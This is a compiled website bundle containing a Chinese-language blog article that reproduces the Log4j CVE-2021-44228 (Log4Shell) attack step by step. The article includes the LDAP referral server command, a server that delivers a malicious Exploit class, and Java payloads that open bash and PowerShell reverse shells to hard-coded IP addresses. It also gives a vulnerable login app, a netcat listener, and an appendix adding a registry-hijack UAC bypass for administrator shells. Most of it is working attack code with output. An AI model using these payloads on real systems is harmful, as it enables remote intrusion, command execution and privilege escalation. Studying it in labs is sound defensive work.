"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[7698],{285:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>o,default:()=>p,frontMatter:()=>i,metadata:()=>r,toc:()=>c});const r=JSON.parse('{"id":"Security/log4j","title":"[CVE-2021-44228] log4j \u6f0f\u6d1e\u5fa9\u73fe","description":"CVE-2021-44228 log4j \u6f0f\u6d1e\u5fa9\u73fe","source":"@site/docs/Security/log4j.mdx","sourceDirName":"Security","slug":"/Security/log4j","permalink":"/RulerChen-Website/docs/Security/log4j","draft":false,"unlisted":false,"editUrl":"https://github.com/RulerChen/RulerChen-Website/tree/main/docs/Security/log4j.mdx","tags":[],"version":"current","lastUpdatedAt":1728953658000,"sidebarPosition":10,"frontMatter":{"title":"[CVE-2021-44228] log4j \u6f0f\u6d1e\u5fa9\u73fe","sidebar_position":10,"description":"CVE-2021-44228 log4j \u6f0f\u6d1e\u5fa9\u73fe","keywords":["CVE-2021-44228","log4j","log4j \u6f0f\u6d1e"]},"sidebar":"tutorialSidebar","previous":{"title":"[PG] PostgreSQL High Availability","permalink":"/RulerChen-Website/docs/PostgreSQL/pg-ha"},"next":{"title":"\u5982\u4f55\u4f7f\u7528 C# \u5275\u5efa\u60e1\u610f Windows \u670d\u52d9\u4f86\u56de\u5f48\u7cfb\u7d71\u6b0a\u9650\u7684 shell","permalink":"/RulerChen-Website/docs/Security/windowsservice"}}');var s=t(4848),a=t(8453);const i={title:"[CVE-2021-44228] log4j \u6f0f\u6d1e\u5fa9\u73fe",sidebar_position:10,description:"CVE-2021-44228 log4j \u6f0f\u6d1e\u5fa9\u73fe",keywords:["CVE-2021-44228","log4j","log4j \u6f0f\u6d1e"]},o=void 0,l={},c=[{value:"\u6982\u8ff0",id:"\u6982\u8ff0",level:2},{value:"\u96f2\u7aef\u74b0\u5883",id:"\u96f2\u7aef\u74b0\u5883",level:2},{value:"LDAP \u4e3b\u6a5f\u67b6\u8a2d",id:"ldap-\u4e3b\u6a5f\u67b6\u8a2d",level:2},{value:"\u60e1\u610f class \u4e3b\u6a5f\u67b6\u8a2d",id:"\u60e1\u610f-class-\u4e3b\u6a5f\u67b6\u8a2d",level:2},{value:"Reverse Shell \u4e3b\u6a5f\u67b6\u8a2d",id:"reverse-shell-\u4e3b\u6a5f\u67b6\u8a2d",level:2},{value:"\u53d7\u5bb3\u8005\u4e3b\u6a5f\u67b6\u8a2d",id:"\u53d7\u5bb3\u8005\u4e3b\u6a5f\u67b6\u8a2d",level:2},{value:"\u6e2c\u8a66",id:"\u6e2c\u8a66",level:2},{value:"Appendix 1 : \u5c07 Docker \u6539\u6210 Windows \u74b0\u5883",id:"appendix-1--\u5c07-docker-\u6539\u6210-windows-\u74b0\u5883",level:2},{value:"Appendix 2 : \u56de\u5f48\u6709 Admin \u6b0a\u9650\u7684 shell",id:"appendix-2--\u56de\u5f48\u6709-admin-\u6b0a\u9650\u7684-shell",level:2},{value:"\u53c3\u8003",id:"\u53c3\u8003",level:2}];function d(e){const n={a:"a",code:"code",h2:"h2",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",ul:"ul",...(0,a.R)(),...e.components},{Head:r}=n;return r||function(e,n){throw new Error("Expected "+(n?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Head",!0),(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(r,{children:(0,s.jsx)("title",{children:"[CVE-2021-44228] log4j \u6f0f\u6d1e\u5fa9\u73fe"})}),"\n",(0,s.jsx)(n.h2,{id:"\u6982\u8ff0",children:"\u6982\u8ff0"}),"\n",(0,s.jsx)(n.p,{children:"\u672c\u6587\u6703\u5728\u672c\u5730\u7aef Windows \u4e2d\u7684 docker \u6a21\u64ec\u4e00\u500b\u542b\u6709\u6f0f\u6d1e\u7684 log4j \u74b0\u5883\uff0c\u4e26\u4e14\u5c07\u653b\u64ca\u7528\u7684 server \u653e\u5728 gcp \u4e0a\uff0c\u6700\u5f8c\u56de\u5f48\u4e00\u500b shell \u7d66\u653b\u64ca\u8005\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u540c\u6642\u4e5f\u63d0\u4f9b\u4e86\u76ee\u6a19\u74b0\u5883\u5728 Windows (\u7121 docker) \u4e0b\u7684\u74b0\u5883\u8a2d\u5b9a\uff0c\u4ee5\u53ca\u5982\u4f55\u56de\u5f48\u6709 Admin \u6b0a\u9650\u7684 shell \u7684\u65b9\u6cd5\u3002"}),"\n",(0,s.jsx)(n.h2,{id:"\u96f2\u7aef\u74b0\u5883",children:"\u96f2\u7aef\u74b0\u5883"}),"\n",(0,s.jsx)(n.p,{children:"\u5728\u96f2\u7aef\u7684\u74b0\u5883\u4e2d\uff0c\u6211\u5011\u4f7f\u7528\u4e86\u4e09\u53f0 VM (\u5be6\u969b\u4e0a\u4e0d\u9700\u8981\u9019\u9ebc\u591a\uff0c\u53ea\u662f\u70ba\u4e86\u5340\u5206\u529f\u80fd)\uff0c\u7279\u5225\u8981\u6ce8\u610f\u7684\u662f\u6709\u95dc\u9632\u706b\u7246\u7684\u8a2d\u5b9a\uff0c\u6709\u4f7f\u7528\u5230\u7684 port \u8a18\u5f97\u90fd\u8981\u958b\u555f\u8f38\u5165 / \u8f38\u51fa\u7684\u9632\u706b\u7246\u3002"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"image",src:t(7346).A+"",width:"864",height:"523"})}),"\n",(0,s.jsx)(n.p,{children:"\u6709\u53e6\u4e00\u9ede\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u6211\u5011\u5728\u4f7f\u7528\u6642\u90fd\u662f\u4f7f\u7528\u672c\u5730 windows \u7684 powershell \u4f86\u9023\u7dda gce\uff0c\u6211\u5728\u64cd\u4f5c\u6642\u767c\u73fe\u4f7f\u7528 cloud shell \u4f3c\u4e4e\u6c92\u8fa6\u6cd5\u6b63\u5e38\u63a5\u6536 reverse shell\uff0c\u5efa\u8b70\u5982\u679c\u6709\u8981\u9032\u884c\u64cd\u4f5c\u7684\u8a71\u53ef\u4ee5\u5728 Compute Engine -> \u4e2d\u7e7c\u8cc7\u6599 -> \u5b89\u5168\u6bbc\u5c64\u91d1\u9470 \u4e2d\u52a0\u5165\u81ea\u5df1\u7684\u91d1\u9470\u4f86\u9032\u884c ssh\u3002"}),"\n",(0,s.jsx)(n.h2,{id:"ldap-\u4e3b\u6a5f\u67b6\u8a2d",children:"LDAP \u4e3b\u6a5f\u67b6\u8a2d"}),"\n",(0,s.jsxs)(n.p,{children:["\u5728 LDAP \u4e3b\u6a5f\u4e2d\uff0c\u6211\u5011\u53c3\u8003\u4e86 ",(0,s.jsx)(n.a,{href:"https://github.com/mbechler/marshalsec/tree/master",children:"\u9019\u7bc7 GitHub"})," \u4e0a\u7684\u505a\u6cd5\uff0c\u4e26\u4f7f\u7528\u4ee5\u4e0b\u6307\u4ee4\u4f86\u57f7\u884c :"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://35.221.253.187:8080/#Exploit\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5c07\u8def\u5f91\u6307\u5230\u653e\u6709\u60e1\u610f class \u7684 server \u4e0a\uff0c\u518d\u6b21\u5f37\u8abf\u5fc5\u9808\u958b\u555f\u9632\u706b\u7246\u624d\u80fd\u4f7f\u7528\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u6210\u529f\u4e4b\u5f8c\u6703\u51fa\u73fe\u4ee5\u4e0b\u8a0a\u606f :"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-txt",children:"Listening on 0.0.0.0:1389\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u6536\u5230\u6307\u4ee4\u5f8c\u6703\u51fa\u73fe\u4ee5\u4e0b\u8a0a\u606f :"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-txt",children:"Send LDAP reference result for Exploit redirecting to http://35.221.253.187:8080/Exploit.class\n"})}),"\n",(0,s.jsx)(n.h2,{id:"\u60e1\u610f-class-\u4e3b\u6a5f\u67b6\u8a2d",children:"\u60e1\u610f class \u4e3b\u6a5f\u67b6\u8a2d"}),"\n",(0,s.jsxs)(n.p,{children:["\u4e3b\u8981\u6709\u5169\u500b\u6a94\u6848 ",(0,s.jsx)(n.code,{children:"DetailedHttpServer.java"})," \u548c ",(0,s.jsx)(n.code,{children:"Exploit.java"}),"\uff0c\u5206\u5225\u662f\u7528\u4f86\u5efa\u7acb\u4e00\u500b\u7c21\u55ae\u7684 http server \u548c\u8a2d\u5b9a reverse bash (\u60e1\u610f\u6a94\u6848)\u3002"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-java",metastring:'title="DetailedHttpServer.java" showLineNumbers',children:'import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.time.LocalDateTime;\nimport java.time.format.DateTimeFormatter;\nimport com.sun.net.httpserver.HttpServer;\nimport com.sun.net.httpserver.HttpExchange;\n\npublic class DetailedHttpServer {\n    public static void main(String[] args) throws IOException {\n        HttpServer server = HttpServer.create(new InetSocketAddress(8080), 0);\n        server.createContext("/", DetailedHttpServer::handleRequest);\n        server.start();\n        System.out.println("Server started on port 8080");\n    }\n\n    private static void handleRequest(HttpExchange exchange) throws IOException {\n        String remoteAddress = exchange.getRemoteAddress().toString();\n        String method = exchange.getRequestMethod();\n        String path = exchange.getRequestURI().getPath();\n        String timestamp = LocalDateTime.now().format(DateTimeFormatter.ISO_LOCAL_DATE_TIME);\n\n        System.out.println("-------- New Request --------");\n        System.out.println("Time: " + timestamp);\n        System.out.println("Remote Address: " + remoteAddress);\n        System.out.println("Method: " + method);\n        System.out.println("Path: " + path);\n        System.out.println("-----------------------------");\n\n        try {\n            byte[] response = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get("Exploit.class"));\n            exchange.getResponseHeaders().set("Content-Type", "application/octet-stream");\n            exchange.sendResponseHeaders(200, response.length);\n            try (OutputStream os = exchange.getResponseBody()) {\n                os.write(response);\n            }\n            System.out.println("File sent successfully.");\n        } catch (IOException e) {\n            String errorMessage = "File not found or error reading file.";\n            exchange.sendResponseHeaders(404, errorMessage.length());\n            try (OutputStream os = exchange.getResponseBody()) {\n                os.write(errorMessage.getBytes());\n            }\n            System.out.println("Error: " + errorMessage);\n        }\n        System.out.println("Request handled.");\n    }\n}\n'})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-java",metastring:'title="Exploit.java" showLineNumbers {6-7}',children:'import java.io.IOException;\n\npublic class Exploit {\n    static {\n        try {\n            String host = "104.199.254.153";\n            int port = 8000;\n\n            String[] command = {\n                "bash", "-c", String.format(\n                    "bash -i >& /dev/tcp/%s/%d 0>&1",\n                    host,\n                    port\n                )\n            };\n\n            ProcessBuilder pb = new ProcessBuilder(command);\n            pb.redirectErrorStream(true);\n            Process process = pb.start();\n            System.out.println("Reverse shell command executed.");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u91cd\u8981\u7684\u662f\uff0c\u53d7\u9650\u65bc log4j \u7684\u7248\u672c\uff0c\u6211\u5011\u9700\u8981\u4f7f\u7528\u820a\u7248\u7684 java \u4f86\u9032\u884c\u7de8\u8b6f\uff0c\u6307\u4ee4\u5982\u4e0b :"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"sudo javac -source 1.8 -target 1.8 DetailedHttpServer.java\nsudo javac -source 1.8 -target 1.8 Exploit.java\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u63a5\u8457\u555f\u52d5 http server :"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"java DetailedHttpServer\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5982\u679c\u6210\u529f\u555f\u52d5\u6703\u51fa\u73fe\u4ee5\u4e0b\u8a0a\u606f :"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-txt",children:"Server started on port 8080\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5982\u679c\u6709\u6536\u5230 request \u6703\u51fa\u73fe\u4ee5\u4e0b\u8a0a\u606f :"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-txt",children:"-------- New Request --------\nTime: 2024-09-09T14:33:26.037407574\nRemote Address: /140.112.107.38:55906\nMethod: GET\nPath: /Exploit.class\n-----------------------------\nFile sent successfully.\nRequest handled.\n"})}),"\n",(0,s.jsx)(n.h2,{id:"reverse-shell-\u4e3b\u6a5f\u67b6\u8a2d",children:"Reverse Shell \u4e3b\u6a5f\u67b6\u8a2d"}),"\n",(0,s.jsx)(n.p,{children:"\u6700\u5f8c\u9019\u500b\u4e3b\u6a5f\u7684\u529f\u80fd\u5c31\u662f\u7528\u4f86\u63a5\u6536 reverse shell\uff0c\u9996\u5148\u9700\u8981\u5b89\u88dd netcat :"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"sudo apt-get install netcat-openbsd\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u63a5\u8457\u76e3\u807d 8000 port :"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"nc -vnlp 8000\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u555f\u52d5\u5f8c\u6703\u51fa\u73fe\u4ee5\u4e0b\u8a0a\u606f :"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-txt",children:"Listening on 0.0.0.0 8000\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5982\u679c\u6210\u529f\u76e3\u807d\u6703\u51fa\u73fe\u4ee5\u4e0b\u8a0a\u606f :"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-txt",children:"Connection received on 140.112.107.38 55907\nbash: cannot set terminal process group (1): Not a tty\nbash: no job control in this shell\nbash-4.4#\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u770b\u5230\u8a0a\u606f\u5f8c\u5c31\u8868\u793a\u6211\u5011\u6210\u529f\u9032\u5165\u542b\u6709\u6f0f\u6d1e\u7684 docker \u5bb9\u5668\u4e2d\uff0c\u6211\u5011\u53ef\u4ee5\u76f4\u63a5\u57f7\u884c\u6307\u4ee4\u3002"}),"\n",(0,s.jsx)(n.h2,{id:"\u53d7\u5bb3\u8005\u4e3b\u6a5f\u67b6\u8a2d",children:"\u53d7\u5bb3\u8005\u4e3b\u6a5f\u67b6\u8a2d"}),"\n",(0,s.jsx)(n.p,{children:"\u5728\u53d7\u5bb3\u8005\u7684\u96fb\u8166\u4e2d\uff0c\u9996\u5148\u9700\u8981\u5efa\u7acb\u4e00\u500b java \u7684 http server \u4f86\u63a5\u6536\u4f7f\u7528\u8005\u6253\u7684 api\uff0c\n\u63a5\u8457\u4f7f\u7528 docker \u4f86\u69cb\u5efa\u4e00\u500b\u542b\u6709\u6f0f\u6d1e\u7684 log4j \u74b0\u5883\u3002"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-java",metastring:'title="VulnerableApp.java" showLineNumbers {64-67}',children:'import org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\nimport com.sun.net.httpserver.HttpExchange;\nimport com.sun.net.httpserver.HttpHandler;\nimport com.sun.net.httpserver.HttpServer;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.nio.charset.StandardCharsets;\nimport java.util.concurrent.Executors;\n\npublic class VulnerableApp {\n    private static final Logger logger = LogManager.getLogger(VulnerableApp.class);\n\n    public static void main(String[] args) throws IOException {\n        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");\n\n        HttpServer server = HttpServer.create(new InetSocketAddress(8080), 0);\n        server.createContext("/login", new LoginHandler());\n        server.setExecutor(Executors.newFixedThreadPool(10));\n        server.start();\n\n        System.out.println("Server started on port 8080");\n    }\n\n    static class LoginHandler implements HttpHandler {\n        @Override\n        public void handle(HttpExchange exchange) throws IOException {\n            if ("POST".equals(exchange.getRequestMethod())) {\n                String requestBody = readRequestBody(exchange.getRequestBody());\n                String[] params = requestBody.split("&");\n                String username = "";\n                String password = "";\n                for (String param : params) {\n                    String[] keyValue = param.split("=");\n                    if (keyValue.length == 2) {\n                        if ("username".equals(keyValue[0])) {\n                            username = keyValue[1];\n                        } else if ("password".equals(keyValue[0])) {\n                            password = keyValue[1];\n                        }\n                    }\n                }\n\n                boolean loginSuccess = login(username, password);\n                String response = loginSuccess ? "Login Successful!" : "Login Failed!";\n\n                exchange.sendResponseHeaders(200, response.length());\n                try (OutputStream os = exchange.getResponseBody()) {\n                    os.write(response.getBytes());\n                }\n            } else {\n                String response = "Method Not Allowed";\n                exchange.sendResponseHeaders(405, response.length());\n                try (OutputStream os = exchange.getResponseBody()) {\n                    os.write(response.getBytes());\n                }\n            }\n        }\n\n        private boolean login(String username, String password) {\n            logger.error("Login attempt: ${jndi:ldap://35.229.194.59:1389/Exploit}" + username);\n            return "admin".equals(username) && "password".equals(password);\n        }\n\n        private String readRequestBody(InputStream is) throws IOException {\n            ByteArrayOutputStream buffer = new ByteArrayOutputStream();\n            byte[] data = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = is.read(data, 0, data.length)) != -1) {\n                buffer.write(data, 0, bytesRead);\n            }\n            return new String(buffer.toByteArray(), StandardCharsets.UTF_8);\n        }\n    }\n}\n'})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-dockerfile",metastring:'title="Dockerfile"',children:'FROM openjdk:8-jdk-alpine\n\nWORKDIR /app\n\nRUN apk add --no-cache wget curl\n\nRUN wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar\nRUN wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar\n\nCOPY VulnerableApp.java /app\n\nRUN javac -cp /app/log4j-core-2.14.1.jar:/app/log4j-api-2.14.1.jar VulnerableApp.java\n\nEXPOSE 8080\n\nCMD ["java", "-cp", ".:/app/log4j-core-2.14.1.jar:/app/log4j-api-2.14.1.jar", "VulnerableApp"]\n'})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"docker build -t vulnerable-app .\n\ndocker run -p 8080:8080 vulnerable-app\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u7531\u65bc\u6211\u5011\u524d\u9762\u8981\u6c42\u56de\u50b3\u7684 shell \u662f bash\uff0c\u4f46\u5728\u9019\u500b container \u4e2d\u4e26\u6c92\u6709 bash\uff0c\u56e0\u6b64\u6211\u5011\u9700\u8981\u5728 container \u4e2d\u5b89\u88dd bash :"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"apk add --no-cache bash\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u63a5\u8457\u8f38\u5165 ",(0,s.jsx)(n.code,{children:"which bash"})," \u4f86\u78ba\u8a8d\u662f\u5426\u5b89\u88dd\u6210\u529f\u3002"]}),"\n",(0,s.jsx)(n.h2,{id:"\u6e2c\u8a66",children:"\u6e2c\u8a66"}),"\n",(0,s.jsx)(n.p,{children:"\u6211\u5011\u53ef\u4ee5\u5728 powershell \u4e2d\u4f7f\u7528 wget \u4f86\u6e2c\u8a66\u662f\u5426\u6210\u529f :"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'wget -Method Post -Uri http://localhost:8080/login -Body "username=admin&password=password"\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u61c9\u8a72\u53ef\u4ee5\u770b\u5230\u4ee5\u4e0b\u6210\u529f\u8a0a\u606f :"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-txt",children:"StatusCode        : 200\nStatusDescription : OK\nContent           : {76, 111, 103, 105...}\nRawContent        : HTTP/1.1 200 OK\n                    Content-Length: 17\n                    Date: Mon, 09 Sep 2024 14:33:25 GMT\n\n                    Login Successful!\nHeaders           : {[Content-Length, 17], [Date, Mon, 09 Sep 2024 14:33:25 GMT]}\nRawContentLength  : 17\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u63a5\u8457\u6211\u5011\u61c9\u8a72\u4e5f\u53ef\u4ee5\u5728 reverse shell \u4e2d\u770b\u5230 bash \u6210\u529f\u8df3\u51fa\uff0c\u4ee3\u8868\u9019\u6b21\u7684\u653b\u64ca\u6210\u529f\u3002"}),"\n",(0,s.jsx)(n.h2,{id:"appendix-1--\u5c07-docker-\u6539\u6210-windows-\u74b0\u5883",children:"Appendix 1 : \u5c07 Docker \u6539\u6210 Windows \u74b0\u5883"}),"\n",(0,s.jsxs)(n.p,{children:["\u524d\u9762\u7684 ",(0,s.jsx)(n.code,{children:"Exploit.java"})," \u4f7f\u7528 bash \u7684\u539f\u56e0\u662f\u56e0\u70ba\u6211\u5011\u7684\u53d7\u5bb3\u8005\u96fb\u8166\u662f\u5728 docker \u74b0\u5883\u4e0b\uff0c\u5982\u679c\u6211\u5011\u7684\u76ee\u6a19\u96fb\u8166\u662f Windows \u7684\u8a71\uff0c\u6211\u5011\u53ef\u4ee5\u6539\u70ba\u4f7f\u7528 powershell :"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-java",metastring:'title="Exploit.java" showLineNumbers {6-7}',children:'import java.io.IOException;\n\npublic class Exploit {\n    static {\n        try {\n            String host = "104.199.254.153";\n            int port = 8000;\n            String payload = String.format(\n                "$client = New-Object System.Net.Sockets.TCPClient(\'%s\',%d);" +\n                "$stream = $client.GetStream();" +\n                "$writer = New-Object System.IO.StreamWriter($stream);" +\n                "$reader = New-Object System.IO.StreamReader($stream);" +\n                "$writer.AutoFlush = $true;" +\n                "while($true) {" +\n                    "$command = $reader.ReadLine();" +\n                    "if ($command -eq \'exit\') { break }" +\n                    "$output = try { Invoke-Expression $command 2>&1 | Out-String } catch { $_.Exception.Message }" +\n                    "$writer.WriteLine($output)" +\n                "}" +\n                "$client.Close()",\n                host, port\n            );\n\n            String[] command = {\n                "powershell.exe",\n                "-NoProfile",\n                "-ExecutionPolicy", "Bypass",\n                "-Command", payload\n            };\n\n            ProcessBuilder pb = new ProcessBuilder(command);\n            pb.redirectErrorStream(true);\n            Process process = pb.start();\n            System.out.println("PowerShell reverse shell command executed.");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u8981\u5728 Windows \u4e2d\u5efa\u7acb\u74b0\u5883\uff0c\u6211\u5011\u53ef\u4ee5\u4f9d\u64da\u4ee5\u4e0b\u6b65\u9a5f\u4f86\u5efa\u7acb\u74b0\u5883 :"}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsxs)(n.li,{children:["\u9996\u5148\u5230 ",(0,s.jsx)(n.a,{href:"https://www.openlogic.com/openjdk-downloads?field_java_parent_version_target_id=416&field_operating_system_target_id=436&field_architecture_target_id=391&field_java_package_target_id=396",children:"\u9019\u500b\u7db2\u7ad9"})," \u5b89\u88dd java-8"]}),"\n",(0,s.jsxs)(n.li,{children:["\u63a5\u8457\u5b89\u88dd ",(0,s.jsx)(n.a,{href:"https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar",children:"log4j-core-2.14.1.jar"})," \u548c ",(0,s.jsx)(n.a,{href:"https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar",children:"log4j-api-2.14.1.jar"})]}),"\n",(0,s.jsx)(n.li,{children:"\u5728 powershell \u4e2d\u57f7\u884c\u4ee5\u4e0b\u6307\u4ee4"}),"\n"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-pwsh",children:'javac -cp "log4j-core-2.14.1.jar;log4j-api-2.14.1.jar" VulnerableApp.java\n'})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-pwsh",children:'java -cp ".;log4j-core-2.14.1.jar;log4j-api-2.14.1.jar" VulnerableApp\n'})}),"\n",(0,s.jsx)(n.h2,{id:"appendix-2--\u56de\u5f48\u6709-admin-\u6b0a\u9650\u7684-shell",children:"Appendix 2 : \u56de\u5f48\u6709 Admin \u6b0a\u9650\u7684 shell"}),"\n",(0,s.jsx)(n.p,{children:"\u53ef\u4ee5\u4f7f\u7528 UAC bypass \u7684\u65b9\u5f0f\u4f86\u53d6\u5f97 Admin \u6b0a\u9650\uff0c\u4ee5\u4e0b\u662f\u4e00\u500b\u7c21\u55ae\u7684\u7bc4\u4f8b :"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-java",metastring:'title="Exploit.java"',children:'import java.io.FileWriter;\nimport java.io.IOException;\n\npublic class Exploit {\n    static {\n        try {\n            String host = "104.199.254.153";\n            int port = 8000;\n\n            // PowerShell payload as a string\n            String payload = String.format(\n                "$client = New-Object System.Net.Sockets.TCPClient(\'%s\', %d);" +\n                "$stream = $client.GetStream();" +\n                "$writer = New-Object System.IO.StreamWriter($stream);" +\n                "$reader = New-Object System.IO.StreamReader($stream);" +\n                "$writer.AutoFlush = $true;" +\n                "while ($true) {" +\n                    "$command = $reader.ReadLine();" +\n                    "if ($command -eq \'exit\') { break }" +\n                    "$output = try { Invoke-Expression $command 2>&1 | Out-String } catch { $_.Exception.Message };" +\n                    "$writer.WriteLine($output);" +\n                "}" +\n                "$client.Close();", host, port);\n\n            // Write the payload to a .ps1 file\n            String ps1FilePath = System.getProperty("user.home") + "\\\\reverse_shell.ps1";\n            try (FileWriter fileWriter = new FileWriter(ps1FilePath)) {\n                fileWriter.write(payload);\n            }\n\n            // Define the UAC bypass function\n            String uacBypassCommand = String.format(\n                "function uacbypass { " +\n                    "param($ps1Path) " +\n                    "New-Item -Force -Path \'HKCU:\\\\Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\' -Value (\'powershell -ExecutionPolicy Bypass -WindowStyle hidden -File \\"\' + $ps1Path + \'\\"\'); " +\n                    "New-ItemProperty -Force -Path \'HKCU:\\\\Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\' -Name \'DelegateExecute\'; " +\n                    "Start-Process -FilePath $env:windir\\\\system32\\\\sdclt.exe; " +\n                    "Start-Sleep -s 2; " +\n                    "Remove-Item -Path \'HKCU:\\\\Software\\\\Classes\\\\Folder\' -Recurse;" +\n                "}; " +\n                // Call uacbypass to execute the .ps1 script\n                "uacbypass \'%s\';", ps1FilePath\n            );\n\n            // Run the UAC bypass PowerShell command\n            String[] command = {\n                "cmd.exe", "/c", "start", "/min", "powershell.exe",\n                "-NoProfile",\n                "-WindowStyle", "hidden",\n                "-ExecutionPolicy", "Bypass",\n                "-Command", uacBypassCommand\n            };\n\n            ProcessBuilder pb = new ProcessBuilder(command);\n            pb.redirectErrorStream(true);\n            Process process = pb.start();\n            System.out.println("PowerShell reverse shell and UAC bypass executed.");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u7684\u6307\u4ee4\u4f86\u78ba\u5b9a\u662f\u5426\u6709\u6210\u529f\u53d6\u5f97 Admin \u6b0a\u9650 :"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-pwsh",children:"[bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)\n"})}),"\n",(0,s.jsx)(n.h2,{id:"\u53c3\u8003",children:"\u53c3\u8003"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://www.youtube.com/watch?v=Fnuky41Eldo",children:"CVE-2021-44228-Log4j \u6f0f\u6d1e\u5206\u6790\u53ca\u6f0f\u6d1e\u8907\u73fe(Log4j POC)"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://blog.csdn.net/FisrtBqy/article/details/130680143",children:"Log4j2 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u539f\u7406\u4e0e\u590d\u73b0"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://www.youtube.com/watch?v=kj2v_CQ8sSM",children:"Youtube \u5f71\u7247\u793a\u7bc4"})}),"\n"]})]})}function p(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},7346:(e,n,t)=>{t.d(n,{A:()=>r});const r=t.p+"assets/images/1-d431a5db3cbb66e787819eec5ac6409f.png"},8453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>o});var r=t(6540);const s={},a=r.createContext(s);function i(e){const n=r.useContext(a);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:i(e.components),r.createElement(a.Provider,{value:n},e.children)}}}]);